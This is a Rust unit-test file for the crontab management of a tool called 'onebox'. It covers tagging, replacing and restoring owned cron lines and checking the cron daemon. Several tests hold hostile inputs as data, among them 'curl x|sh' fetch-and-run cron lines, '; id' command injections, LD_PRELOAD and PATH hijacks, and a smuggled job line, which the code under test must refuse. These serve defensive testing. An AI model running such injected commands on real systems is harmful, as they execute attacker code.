use super::testing::{fake_crontab, text};
use super::*;
use crate::host::init::InitSystem;
use crate::sys::exec::{FakeExec, Output};
use crate::sys::fs::TempDir;
use crate::sys::text::quote_shell;
use std::sync::Arc;

fn default_paths() -> Paths {
    Paths::from_lookup(|_| None).unwrap()
}

fn tab(text: &str) -> Crontab {
    Crontab::parse(&default_paths(), text)
}

fn tag(s: &str) -> Tag {
    Tag::new(s).unwrap()
}

fn tags(tab: &Crontab) -> Vec<String> {
    tab.owned().map(|(t, _)| t.to_string()).collect()
}

const V1_BOOT: &str =
    "@reboot /usr/local/bin/onebox net-apply >/dev/null 2>&1; /usr/local/bin/onebox start >/dev/null 2>&1";

#[test]
fn classifies_v3_tags_and_every_older_marker() {
    let o = Ownership::of(&default_paths());
    let cases: &[(&str, Option<&str>)] = &[
        ("17 4 * * * x renew --cron >>'/l' 2>&1 # onebox:renew", Some("renew")),
        ("@reboot x # onebox:boot:onebox-xray  \t\r", Some("boot:onebox-xray")),
        ("17 3 * * * x # onebox:frp-renew", Some("frp-renew")),
        ("x # onebox:bad tag", None),
        ("x # onebox:", None),
        ("x #onebox:renew", None),
        ("17 4 * * * /usr/local/bin/onebox cert renew proxy --cron >/dev/null 2>&1 # onebox-native-cert-proxy", Some("renew")),
        ("17 4 * * * onebox cert renew site # onebox-native-cert-site\r", Some("renew")),
        ("17 4 * * * x # onebox-native-cert-subscription ", Some("renew")),
        ("@reboot onebox service onebox-xray start # onebox-rust:onebox-xray", Some("boot:onebox-xray")),
        ("@reboot onebox frps start # onebox-rust:onebox-frps", Some("boot:onebox-frps")),
        ("@reboot x # onebox-rust:../../evil", None),
        ("17 3 * * * x frps renew --cron >>'/l' 2>&1 # onebox-frps-renew", Some("frp-renew")),
        ("@reboot x frps start >>'/b' 2>&1 # onebox-frps-boot", Some("frp-boot")),
        (V1_BOOT, Some("legacy-boot")),
        (&format!("  {V1_BOOT}\r"), Some("legacy-boot")),
        ("@reboot '/usr/local/bin/onebox' net-apply >/dev/null 2>&1; /usr/local/bin/onebox start >/dev/null 2>&1", Some("legacy-boot")),
        (&format!("{V1_BOOT}; admin-command"), None),
        (&format!("{V1_BOOT} # note"), None),
        ("@reboot /opt/other/onebox net-apply >/dev/null 2>&1; /opt/other/onebox start >/dev/null 2>&1", None),
        ("0 0 * * * \"/etc/onebox/tls/acme\"/acme.sh --cron --home \"/etc/onebox/tls/acme\" > /dev/null", None),
        ("0 0 * * * /etc/onebox/tls/acme/acme.sh --cron --home /etc/onebox/tls/acme > /dev/null", Some("renew")),
        ("0 0 * * * /etc/onebox/site/acme/acme.sh --cron", Some("renew")),
        ("0 0 * * * /etc/onebox/site/acme/acme.sh --cronjob", None),
        ("0 3 * * * /usr/local/bin/onebox cert-renew site --cron", Some("renew")),
        ("0 3 * * * /usr/local/bin/onebox cert-renew other --cron", None),
        ("* * * * * admin-command # other", None),
        ("MAILTO=root", None),
        ("", None),
    ];
    for (line, want) in cases {
        let got = o.classify(line);
        assert_eq!(got.as_ref().map(Tag::as_str), *want, "{line:?}");
    }
    // The v1 line follows the configured executable, quoted when needed.
    let mut paths = default_paths();
    paths.executable = "/opt/my onebox/bin".into();
    let o = Ownership::of(&paths);
    let quoted = "@reboot '/opt/my onebox/bin' net-apply >/dev/null 2>&1; '/opt/my onebox/bin' start >/dev/null 2>&1";
    assert_eq!(o.classify(quoted), Some(Tag::legacy_boot()));
    let bare = "@reboot /opt/my onebox/bin net-apply >/dev/null 2>&1; /opt/my onebox/bin start >/dev/null 2>&1";
    assert_eq!(o.classify(bare), None);
}

#[test]
fn tags_are_validated() {
    assert!(Tag::new("boot:onebox-xray").is_ok());
    for bad in ["", "a b", "x\n", "a;b", &"x".repeat(97)] {
        assert!(Tag::new(bad).is_err(), "{bad:?}");
    }
    assert_eq!(
        Tag::boot("onebox-site").unwrap().as_str(),
        "boot:onebox-site"
    );
    assert!(Tag::boot("sshd").is_err());
}

#[test]
fn scopes_split_node_and_frp_lines() {
    for (t, node) in [
        ("renew", true),
        ("legacy-boot", true),
        ("boot:onebox-xray", true),
        ("boot:onebox-subscription-web", true),
        ("frp-renew", false),
        ("frp-boot", false),
        ("boot:onebox-frps", false),
        ("boot:onebox-frp-web", false),
    ] {
        assert_eq!(Scope::Node.covers(&tag(t)), node, "{t}");
        assert_eq!(Scope::Frp.covers(&tag(t)), !node, "{t}");
    }
}

#[test]
fn text_round_trips_and_always_ends_with_a_newline() {
    let original = "MAILTO=root\r\n# comment\n\n0 1 * * * job";
    let t = tab(original);
    assert_eq!(t.text(), "MAILTO=root\r\n# comment\n\n0 1 * * * job\n");
    assert!(t.is_modified(), "the missing final newline is added");
    let t = tab("a\nb\n");
    assert_eq!(t.text(), "a\nb\n");
    assert!(!t.is_modified());
    assert_eq!(tab("").text(), "");
}

#[test]
fn replace_swaps_a_group_in_place_and_keeps_foreign_order() {
    let original = "MAILTO=root\n\
        17 4 * * * a # onebox-native-cert-proxy\n\
        0 1 * * * backup\n\
        17 4 * * * b # onebox-native-cert-site\n\
        @reboot c # onebox-rust:onebox-xray\n\
        17 4 * * * d # onebox-native-cert-subscription\n\
        30 2 * * * report\n";
    let mut t = tab(original);
    assert_eq!(t.lines_for("renew").len(), 3);
    assert_eq!(
        t.lines_for("boot:"),
        ["@reboot c # onebox-rust:onebox-xray"]
    );
    assert_eq!(t.lines_for("").len(), 4);
    let renew = "17 4 * * * new # onebox:renew".to_owned();
    assert!(t
        .replace(&Tag::renew(), std::slice::from_ref(&renew))
        .unwrap());
    assert_eq!(
        t.text(),
        "MAILTO=root\n17 4 * * * new # onebox:renew\n0 1 * * * backup\n\
         @reboot c # onebox-rust:onebox-xray\n30 2 * * * report\n"
    );
    // Same content again: unchanged.
    assert!(!t.replace(&Tag::renew(), &[renew]).unwrap());

    // A new group is appended.
    let boot = "@reboot s # onebox:boot:onebox-sing-box".to_owned();
    t.replace(
        &Tag::boot("onebox-sing-box").unwrap(),
        std::slice::from_ref(&boot),
    )
    .unwrap();
    assert!(t.text().ends_with(&format!("30 2 * * * report\n{boot}\n")));
    assert_eq!(
        tags(&t),
        ["renew", "boot:onebox-xray", "boot:onebox-sing-box"]
    );

    // An empty replacement removes the group.
    assert!(t.replace(&Tag::renew(), &[]).unwrap());
    assert!(!t.has(&Tag::renew()));
}

#[test]
fn replace_refuses_lines_of_another_owner() {
    let mut t = tab("a\n");
    for bad in [
        "17 4 * * * x # onebox:frp-renew",
        "17 4 * * * foreign",
        "17 4 * * * x # onebox:renew\n* * * * * evil # onebox:renew",
    ] {
        assert!(
            t.replace(&Tag::renew(), &[bad.to_owned()]).is_err(),
            "{bad:?}"
        );
    }
    assert_eq!(t.text(), "a\n", "nothing changed");
}

#[test]
fn remove_and_remove_scope() {
    let mut t = tab(&format!(
        "a\n{V1_BOOT}\n@reboot x # onebox:boot:onebox-frps\nb # onebox:renew\nc\n"
    ));
    assert!(t.remove(&Tag::legacy_boot()));
    assert!(!t.remove(&Tag::legacy_boot()));
    assert!(t.remove_scope(Scope::Node));
    assert_eq!(t.text(), "a\n@reboot x # onebox:boot:onebox-frps\nc\n");
    assert!(t.remove_scope(Scope::Frp));
    assert_eq!(t.text(), "a\nc\n");
}

/// Real lines of every form (default layout).
mod lines {
    use super::*;

    pub const EXE: &str = "/usr/local/bin/onebox";

    fn env(init: &str) -> String {
        let mut env: Vec<String> = default_paths()
            .service_env()
            .into_iter()
            .map(|(k, v)| format!("{k}={}", quote_shell(&v)))
            .collect();
        env.push(format!("ONEBOX_INIT='{init}'"));
        env.join(" ")
    }

    pub fn v3(tag: &Tag, args: &[&str]) -> String {
        line(
            "@reboot",
            &default_paths(),
            InitSystem::None,
            args,
            Path::new("/var/log/onebox/boot.log"),
            tag,
        )
        .unwrap()
    }

    pub fn renew() -> String {
        renew_for(&default_paths())
    }

    pub fn renew_for(paths: &Paths) -> String {
        line(
            "17 4 * * *",
            paths,
            InitSystem::Systemd,
            &["renew", "--cron"],
            &paths.log.join("renew.log"),
            &Tag::renew(),
        )
        .unwrap()
    }

    pub fn boot(service: &str) -> String {
        v3(&Tag::boot(service).unwrap(), &["service", service, "start"])
    }

    pub fn frp_renew() -> String {
        line(
            "17 3 * * *",
            &default_paths(),
            InitSystem::Systemd,
            &["frps", "renew", "--cron"],
            Path::new("/var/log/onebox-frp/renew.log"),
            &Tag::frp_renew(),
        )
        .unwrap()
    }

    pub fn v2_cert(target: &str) -> String {
        let job = if target == "subscription" {
            "subscription renew --cron".to_owned()
        } else {
            format!("cert renew {target} --cron")
        };
        format!("17 4 * * * {EXE} {job} >/dev/null 2>&1 # onebox-native-cert-{target}")
    }

    pub fn v2_boot(service: &str) -> String {
        format!(
            "@reboot env {} '{EXE}' service {service} start >/dev/null 2>&1 # onebox-rust:{service}",
            env("none")
        )
    }

    pub fn v2_frp(renew: bool) -> String {
        let (schedule, job, log, marker) = if renew {
            ("17 3 * * *", "frps renew --cron", "renew", "renew")
        } else {
            ("@reboot", "frps start", "boot", "boot")
        };
        format!(
            "{schedule} env {} '{EXE}' {job} >>'/var/log/onebox-frp/{log}.log' 2>&1 # onebox-frps-{marker}",
            env("systemd")
        )
    }

    pub const RETIRED: &str =
        "0 0 * * * /etc/onebox/tls/acme/acme.sh --cron --home /etc/onebox/tls/acme > /dev/null";
}

fn snap(lines: &[String]) -> CronSnapshot {
    CronSnapshot {
        available: true,
        lines: lines.to_vec(),
        anchors: None,
    }
}

#[test]
fn every_written_form_is_restorable() {
    let o = Ownership::of(&default_paths());
    let mut all = vec![
        lines::renew(),
        lines::boot("onebox-xray"),
        lines::frp_renew(),
        lines::v3(&Tag::frp_boot(), &["frps", "start"]),
        lines::v2_cert("proxy"),
        lines::v2_cert("site"),
        lines::v2_cert("subscription"),
        lines::v2_boot("onebox-site"),
        lines::v2_boot("onebox-frp-web"),
        lines::v2_frp(true),
        lines::v2_frp(false),
        V1_BOOT.to_owned(),
        format!("{}\r", lines::renew()),
    ];
    // v2's fixture form with fewer variables, and the `%`-escaped forms.
    all.push(format!(
        "@reboot env ONEBOX_DIR='/etc/onebox' '{}' service onebox-xray start >/dev/null 2>&1 # onebox-rust:onebox-xray",
        lines::EXE
    ));
    let mut p = default_paths();
    p.log = "/var/log/50%".into();
    all.push(
        line(
            "17 4 * * *",
            &p,
            InitSystem::None,
            &["renew", "--cron"],
            Path::new("/var/log/50%/renew.log"),
            &Tag::renew(),
        )
        .unwrap(),
    );
    for text in &all {
        let (tag, form) = o.classify_form(text).unwrap_or_else(|| panic!("{text}"));
        assert!(o.restorable(text, &tag, form), "{text}");
    }
}

#[test]
fn journal_lines_must_have_an_exact_known_shape() {
    let o = Ownership::of(&default_paths());
    let renew = lines::renew();
    let exe = lines::EXE;
    let bad = vec![
        "* * * * * curl x|sh # onebox:renew".to_owned(),
        renew.replace("renew --cron", "renew --cron; curl x|sh"),
        renew.replace("renew --cron", "update-script"),
        renew.replace("ONEBOX_DIR=", "CF_Token='x' ONEBOX_DIR="),
        renew.replace("ONEBOX_INIT='systemd'", "ONEBOX_INIT='upstart'"),
        renew.replace("'/usr/local/bin/onebox' renew", "'/tmp/evil' renew"),
        renew.replace(">>'/var/log/onebox/renew.log'", ">>'renew.log'"),
        renew.replace(">>'/var/log/onebox/renew.log'", ">/dev/null"),
        renew.replace("2>&1", "2>&1 &"),
        renew.replace("PATH=", "PATH=/tmp:"),
        renew.replace("17 4 * * *", "17 4 * *"),
        renew.replace("/var/log/onebox/renew.log", "/var/log/%/renew.log"),
        lines::boot("onebox-xray").replace("service onebox-xray start", "service onebox-site start"),
        format!("17 4 * * * {exe} cert renew proxy --cron >/dev/null 2>&1; id # onebox-native-cert-proxy"),
        format!("17 4 * * * {exe} cert renew site --cron >/dev/null 2>&1 # onebox-native-cert-proxy"),
        format!("17 4 * * * /tmp/x cert renew proxy --cron >/dev/null 2>&1 # onebox-native-cert-proxy"),
        lines::v2_boot("onebox-xray").replace(" start ", " start; id "),
        lines::v2_boot("onebox-xray").replace("env ONEBOX_DIR", "env LD_PRELOAD='/x' ONEBOX_DIR"),
        lines::v2_frp(true).replace("frps renew --cron", "frps start"),
        lines::v2_frp(false).replace(">>'/var/log/onebox-frp/boot.log'", ">>'/tmp/../x' 2>&1; id"),
    ];
    for text in &bad {
        let accepted = o
            .classify_form(text)
            .is_some_and(|(tag, form)| o.restorable(text, &tag, form));
        assert!(!accepted, "{text}");
    }
    // Restore refuses them before changing anything.
    let mut t = tab(&format!("a\n{renew}\n"));
    for text in &bad[..3] {
        let err = t.restore(&snap(std::slice::from_ref(text)), Scope::Node);
        assert_eq!(err.unwrap_err().to_string(), UNKNOWN_SHAPE, "{text}");
    }
    assert_eq!(t.text(), format!("a\n{renew}\n"));
}

#[test]
fn restore_of_an_unchanged_snapshot_is_a_no_op() {
    let layouts = vec![
        // v2 appended each target's line at different times.
        vec![
            "A".to_owned(),
            lines::v2_cert("proxy"),
            "B".to_owned(),
            lines::v2_cert("site"),
        ],
        vec![
            lines::v2_cert("subscription"),
            "MAILTO=root".to_owned(),
            lines::frp_renew(),
            lines::v2_boot("onebox-xray"),
            "0 1 * * * backup".to_owned(),
            V1_BOOT.to_owned(),
            lines::v2_cert("proxy"),
        ],
        vec![
            lines::renew(),
            lines::RETIRED.to_owned(),
            "x".to_owned(),
            lines::boot("onebox-site"),
            lines::boot("onebox-frps"),
            lines::boot("onebox-sing-box"),
        ],
        vec![],
        vec!["only foreign".to_owned()],
    ];
    for layout in layouts {
        let text: String = layout.iter().map(|l| format!("{l}\n")).collect();
        for scope in [Scope::Node, Scope::Frp] {
            let mut t = tab(&text);
            let snapshot = t.snapshot(scope);
            t.restore(&snapshot, scope).unwrap();
            assert_eq!(t.text(), text, "{scope:?}");
            assert!(!t.is_modified());
            // A v2 journal (no positions) leaves unchanged groups alone too.
            let mut t = tab(&text);
            let v2 = snap(&t.snapshot(scope).lines);
            t.restore(&v2, scope).unwrap();
            assert_eq!(t.text(), text, "{scope:?} without anchors");
        }
    }
}

#[test]
fn rollback_reinstalls_the_original_crontab_byte_for_byte() {
    let original = format!(
        "A\n{}\nB\n{}\n{}\nC\n{}\n{V1_BOOT}\n",
        lines::v2_cert("proxy"),
        lines::v2_boot("onebox-xray"),
        lines::frp_renew(),
        lines::v2_cert("site"),
    );
    let t0 = tab(&original);
    let node = t0.snapshot(Scope::Node);
    assert_eq!(node.lines.len(), 4);
    assert_eq!(node.anchors, Some(vec![1, 2, 4, 4]));
    assert_eq!(t0.snapshot(Scope::Frp).lines, [lines::frp_renew()]);

    // What a v3 finalize does: one renew line, new autostart lines.
    let mut t = t0.clone();
    t.replace(&Tag::renew(), &[lines::renew()]).unwrap();
    t.remove(&Tag::boot("onebox-xray").unwrap());
    t.remove(&Tag::legacy_boot());
    t.replace(
        &Tag::boot("onebox-sing-box").unwrap(),
        &[lines::boot("onebox-sing-box")],
    )
    .unwrap();
    assert_ne!(t.text(), original);
    t.restore(&node, Scope::Node).unwrap();
    assert_eq!(t.text(), original);

    // FRP lines changed meanwhile are kept; node lines still go back.
    let mut t = t0.clone();
    t.replace(&Tag::renew(), &[lines::renew()]).unwrap();
    let frp_new = lines::frp_renew().replace("17 3", "18 3");
    t.replace(&Tag::frp_renew(), std::slice::from_ref(&frp_new))
        .unwrap();
    t.restore(&node, Scope::Node).unwrap();
    assert_eq!(t.text(), original.replace(&lines::frp_renew(), &frp_new));

    // Lines added outside the scope keep their place; anchors past the end
    // land at the end.
    let mut t = tab("A\n");
    let late = CronSnapshot {
        available: true,
        lines: vec![lines::renew()],
        anchors: Some(vec![5]),
    };
    t.restore(&late, Scope::Node).unwrap();
    assert_eq!(t.text(), format!("A\n{}\n", lines::renew()));
}

#[test]
fn restore_refuses_foreign_or_out_of_scope_lines_and_bad_anchors() {
    let renew = lines::renew();
    let mut t = tab(&format!("a\n{renew}\n"));
    for bad in [
        "* * * * * curl evil | sh".to_owned(),
        lines::frp_renew(),
        format!("{renew}\n* * * * * y"),
    ] {
        let err = t.restore(&snap(&[bad.clone()]), Scope::Node).unwrap_err();
        assert_eq!(err.to_string(), NOT_OWNED, "{bad:?}");
    }
    let boot = lines::boot("onebox-xray");
    for (lines, anchors) in [
        (vec![renew.clone()], vec![]),
        (vec![renew.clone()], vec![0, 0]),
        (vec![renew.clone(), boot], vec![1, 0]),
    ] {
        let bad = CronSnapshot {
            available: true,
            lines,
            anchors: Some(anchors.clone()),
        };
        let err = t.restore(&bad, Scope::Node).unwrap_err();
        assert_eq!(err.to_string(), BAD_ANCHORS, "{anchors:?}");
    }
    assert_eq!(t.text(), format!("a\n{renew}\n"));
    t.restore(&snap(&[]), Scope::Node).unwrap();
    assert_eq!(t.text(), "a\n");
}

#[test]
fn retired_jobs_are_kept_while_present_but_never_reinstalled() {
    let retired = lines::RETIRED.to_owned();
    let original = format!("a\n{retired}\nb\n");
    let t0 = tab(&original);
    let node = t0.snapshot(Scope::Node);
    assert_eq!(node.lines, [retired.clone()]);
    // Still there: untouched.
    let mut t = t0.clone();
    t.restore(&node, Scope::Node).unwrap();
    assert_eq!(t.text(), original);
    // Removed by the transaction: not brought back (and a journal cannot
    // smuggle one in).
    let mut t = t0.clone();
    t.remove(&Tag::renew());
    t.restore(&node, Scope::Node).unwrap();
    assert_eq!(t.text(), "a\nb\n");
    let smuggled = "* * * * * curl x|sh /etc/onebox/tls/acme/acme.sh --cron".to_owned();
    let mut t = tab("a\n");
    t.restore(&snap(&[smuggled]), Scope::Node).unwrap();
    assert_eq!(t.text(), "a\n");
}

#[test]
fn listing_tells_no_crontab_from_failures() {
    let ok = |code: i32, stdout: &str, stderr: &str| Output {
        code,
        stdout: stdout.into(),
        stderr: stderr.into(),
    };
    for (out, want) in [
        (ok(0, "a\n", ""), Some("a\n")),
        (ok(1, "", "no crontab for root\n"), Some("")),
        (ok(1, "", "crontab: no crontab for root"), Some("")),
        (
            ok(
                1,
                "",
                "crontab: can't open 'root': No such file or directory\n",
            ),
            Some(""),
        ),
        (ok(1, "", ""), Some("")),
        (
            ok(1, "", "crontab: your UID isn't in the passwd file"),
            None,
        ),
        (ok(1, "a\n", "no crontab for root"), None),
        (ok(2, "", "no crontab for root"), None),
        (ok(124, "", ""), None),
    ] {
        match want {
            Some(text) => assert_eq!(listing(&out).unwrap(), text, "{out:?}"),
            None => assert!(
                listing(&out)
                    .unwrap_err()
                    .to_string()
                    .starts_with("无法读取当前 crontab"),
                "{out:?}"
            ),
        }
    }
}

struct Fixture {
    _dir: TempDir,
    ctx: Ctx,
    exec: Arc<FakeExec>,
}

fn fixture() -> Fixture {
    let dir = TempDir::new("cron").unwrap();
    let (ctx, exec, _) = Ctx::test(dir.path());
    Fixture {
        _dir: dir,
        ctx,
        exec,
    }
}

#[test]
fn install_uses_a_private_temp_file_and_cleans_it_up() {
    let f = fixture();
    let state = fake_crontab(&f.exec, None);
    let mut t = Crontab::read(&f.ctx).unwrap();
    assert_eq!(t.text(), "");
    assert!(!t.save(&f.ctx).unwrap(), "unchanged: nothing installed");
    t.replace(&Tag::renew(), &["0 4 * * * x # onebox:renew".into()])
        .unwrap();
    assert!(t.save(&f.ctx).unwrap());
    assert_eq!(text(&state), "0 4 * * * x # onebox:renew\n");
    let history = f.exec.history();
    assert_eq!(history[0], "crontab -l");
    let file = history[1].strip_prefix("crontab ").unwrap();
    assert!(file.starts_with(
        &f.ctx
            .paths
            .run
            .join(TEMP_PREFIX)
            .to_string_lossy()
            .into_owned()
    ));
    assert!(!Path::new(file).exists(), "temp file removed");
    assert!(f.exec.calls().iter().all(|c| c.timeout.is_some()));

    let f = fixture();
    f.exec.on("crontab", &["-l"], Output::success("a\n")).on(
        "crontab",
        &[],
        Output::failure(1, "errors in crontab file"),
    );
    let mut t = Crontab::read(&f.ctx).unwrap();
    t.remove_scope(Scope::Node);
    t.replace(&Tag::renew(), &["0 4 * * * x # onebox:renew".into()])
        .unwrap();
    let err = t.install(&f.ctx).unwrap_err();
    assert!(err.to_string().contains("errors in crontab file"));
    let leftovers = std::fs::read_dir(&f.ctx.paths.run).unwrap().count();
    assert_eq!(leftovers, 0);
}

#[test]
fn unreadable_crontabs_are_never_overwritten() {
    let f = fixture();
    f.exec.provide("crontab").on(
        "crontab",
        &["-l"],
        Output::failure(1, "crontab: your UID isn't in the passwd file"),
    );
    assert!(Crontab::read(&f.ctx).is_err());
    assert!(snapshot(&f.ctx, Scope::Node).is_err());
    assert!(restore(&f.ctx, &snap(&[]), Scope::Node).is_err());
    assert!(
        f.exec.history().iter().all(|c| c == "crontab -l"),
        "never installed"
    );
}

#[test]
fn transaction_snapshots_with_and_without_crontab() {
    let f = fixture();
    assert_eq!(
        snapshot(&f.ctx, Scope::Node).unwrap(),
        CronSnapshot::default()
    );
    let renew = lines::renew();
    let missing = snap(std::slice::from_ref(&renew));
    assert_eq!(
        restore(&f.ctx, &missing, Scope::Node)
            .unwrap_err()
            .to_string(),
        "恢复续期任务需要 crontab"
    );
    restore(&f.ctx, &CronSnapshot::default(), Scope::Node).unwrap();

    let f = fixture();
    let renew = lines::renew_for(&f.ctx.paths);
    let state = fake_crontab(&f.exec, Some(&format!("a\n{renew}\nb\n")));
    let snapshot = snapshot(&f.ctx, Scope::Node).unwrap();
    assert_eq!(
        snapshot,
        CronSnapshot {
            available: true,
            lines: vec![renew.clone()],
            anchors: Some(vec![1]),
        }
    );
    let boot = lines::boot("onebox-xray");
    *state.lock().unwrap() = Some(format!("a\nb\n{boot}\n"));
    restore(&f.ctx, &snapshot, Scope::Node).unwrap();
    assert_eq!(text(&state), format!("a\n{renew}\nb\n"));
    // Restoring an unchanged crontab installs nothing.
    f.exec.clear_history();
    restore(&f.ctx, &snapshot, Scope::Node).unwrap();
    assert_eq!(f.exec.history(), ["crontab -l"]);

    let json = serde_json::to_string(&snapshot).unwrap();
    assert!(json.contains(r#""anchors":[1]"#), "{json}");
    assert_eq!(
        serde_json::from_str::<CronSnapshot>(&json).unwrap(),
        snapshot
    );
    // The v2 journal shape (no anchors) still reads.
    let v2: CronSnapshot = serde_json::from_str(r#"{"available":true,"lines":["x"]}"#).unwrap();
    assert_eq!(v2.anchors, None);
    let json = serde_json::to_string(&snap(&[])).unwrap();
    assert!(!json.contains("anchors"), "{json}");
}

#[test]
fn concurrent_edits_never_drop_each_others_lines() {
    let f = fixture();
    let state = fake_crontab(&f.exec, Some("a\n"));
    let renew = lines::renew();
    let frp = lines::frp_renew();
    std::thread::scope(|scope| {
        let ctx = &f.ctx;
        let slow = scope.spawn(|| {
            Crontab::edit(ctx, |tab| {
                // Holds the crontab between read and install.
                std::thread::sleep(std::time::Duration::from_millis(150));
                tab.replace(&Tag::renew(), std::slice::from_ref(&renew))
            })
        });
        std::thread::sleep(std::time::Duration::from_millis(30));
        let fast = Crontab::edit(ctx, |tab| {
            tab.replace(&Tag::frp_renew(), std::slice::from_ref(&frp))
        });
        assert!(fast.unwrap());
        assert!(slow.join().unwrap().unwrap());
    });
    assert_eq!(text(&state), format!("a\n{renew}\n{frp}\n"));
    assert!(f.ctx.paths.run.join("crontab.lock").exists());

    // A failing change installs nothing.
    f.exec.clear_history();
    let err = Crontab::edit(&f.ctx, |tab| -> Result<()> {
        tab.remove_scope(Scope::Node);
        Err(Error::msg("中止"))
    });
    assert_eq!(err.unwrap_err().to_string(), "中止");
    assert_eq!(f.exec.history(), ["crontab -l"]);
}

#[test]
fn generated_lines_are_owned_by_their_tag() {
    let paths = default_paths();
    for (t, args) in [
        (Tag::renew(), vec!["renew", "--cron"]),
        (
            Tag::boot("onebox-xray").unwrap(),
            vec!["service", "onebox-xray", "start"],
        ),
        (Tag::frp_renew(), vec!["frps", "renew", "--cron"]),
    ] {
        let l = line(
            "@daily",
            &paths,
            InitSystem::None,
            &args,
            Path::new("/var/log/x.log"),
            &t,
        )
        .unwrap();
        let mut c = tab("x\n");
        c.replace(&t, &[l]).unwrap();
        assert!(c.has(&t));
    }
}

#[test]
fn cron_daemon_checks_per_init_system() {
    // systemd: an active unit is enough.
    let f = fixture();
    f.exec.provide("crontab");
    f.exec
        .on(
            "systemctl",
            &["is-active", "--quiet", "crond"],
            Output::success(""),
        )
        .on("systemctl", &[], Output::failure(3, ""));
    ensure_scheduler_as(&f.ctx, InitSystem::Systemd, true).unwrap();
    assert_eq!(
        f.exec.history(),
        [
            "systemctl is-active --quiet cron",
            "systemctl is-active --quiet crond"
        ]
    );
    // systemd: none active, the second can be enabled.
    let f = fixture();
    f.exec.provide("crontab");
    f.exec
        .on(
            "systemctl",
            &["enable", "--now", "crond"],
            Output::success(""),
        )
        .on("systemctl", &[], Output::failure(1, ""));
    ensure_scheduler_as(&f.ctx, InitSystem::Systemd, true).unwrap();
    assert_eq!(
        f.exec.history().last().unwrap(),
        "systemctl enable --now crond"
    );
    let f = fixture();
    f.exec.provide("crontab");
    f.exec.on("systemctl", &[], Output::failure(1, ""));
    assert_eq!(
        ensure_scheduler_as(&f.ctx, InitSystem::Systemd, true)
            .unwrap_err()
            .to_string(),
        NOT_RUNNING
    );

    // OpenRC: the first script that starts joins the default runlevel.
    let f = fixture();
    f.exec.provide("crontab");
    f.exec
        .on("rc-service", &["cronie", "start"], Output::success(""))
        .on("rc-service", &[], Output::failure(1, "does not exist"))
        .on(
            "rc-update",
            &["add", "cronie", "default"],
            Output::success(""),
        );
    ensure_scheduler_as(&f.ctx, InitSystem::Openrc, true).unwrap();
    assert_eq!(
        f.exec.history(),
        [
            "rc-service crond start",
            "rc-service cronie start",
            "rc-update add cronie default"
        ]
    );
    let f = fixture();
    f.exec.provide("crontab");
    f.exec
        .on("rc-service", &["crond", "start"], Output::success(""))
        .on("rc-update", &[], Output::failure(1, "denied"));
    assert!(ensure_scheduler_as(&f.ctx, InitSystem::Openrc, true).is_err());

    // No init: a cron process must exist.
    let f = fixture();
    f.exec.provide("crontab");
    assert!(ensure_scheduler_as(&f.ctx, InitSystem::None, true).is_err());
    let proc_dir = f.ctx.paths.system("/proc/321");
    std::fs::create_dir_all(&proc_dir).unwrap();
    std::fs::write(proc_dir.join("comm"), "crond\n").unwrap();
    ensure_scheduler_as(&f.ctx, InitSystem::None, true).unwrap();
}

#[test]
fn scheduler_active_only_looks() {
    let f = fixture();
    f.exec
        .on(
            "systemctl",
            &["is-active", "--quiet", "cronie"],
            Output::success(""),
        )
        .on("systemctl", &[], Output::failure(3, ""))
        .on(
            "rc-service",
            &["dcron", "status"],
            Output::success(" * status: started"),
        )
        .on("rc-service", &[], Output::failure(3, " * status: stopped"));
    assert!(scheduler_active(&f.ctx, InitSystem::Systemd));
    assert!(scheduler_active(&f.ctx, InitSystem::Openrc));
    assert!(!scheduler_active(&f.ctx, InitSystem::None));
    let calls = f.exec.history();
    assert!(
        calls
            .iter()
            .all(|c| c.contains("is-active") || c.ends_with(" status")),
        "never starts or enables: {calls:?}"
    );

    let f = fixture();
    f.exec.on("systemctl", &[], Output::failure(3, "")).on(
        "rc-service",
        &[],
        Output::failure(3, ""),
    );
    assert!(!scheduler_active(&f.ctx, InitSystem::Systemd));
    assert!(!scheduler_active(&f.ctx, InitSystem::Openrc));
    assert_eq!(f.exec.history().len(), 3 + 4);
}

#[test]
fn ensure_scheduler_installs_crontab_through_the_package_manager() {
    let f = fixture();
    let proc_dir = f.ctx.paths.system("/proc/9");
    std::fs::create_dir_all(&proc_dir).unwrap();
    std::fs::write(proc_dir.join("comm"), "cron\n").unwrap();
    f.exec.provide("apk");
    let exec = Arc::clone(&f.exec);
    f.exec.on_fn(
        |cmd| cmd.program == "apk",
        move |_| {
            exec.provide("crontab");
            Ok(Output::success(""))
        },
    );
    ensure_scheduler_as(&f.ctx, InitSystem::None, true).unwrap();
    assert_eq!(f.exec.history(), ["apk add --no-cache dcron"]);

    // Already installed: no package manager call.
    f.exec.clear_history();
    ensure_scheduler_as(&f.ctx, InitSystem::None, true).unwrap();
    assert!(f.exec.history().is_empty());

    // Missing and not root: the package manager is never asked.
    let f = fixture();
    let err = ensure_scheduler_as(&f.ctx, InitSystem::None, false).unwrap_err();
    assert!(f.exec.history().is_empty(), "{err}");
}
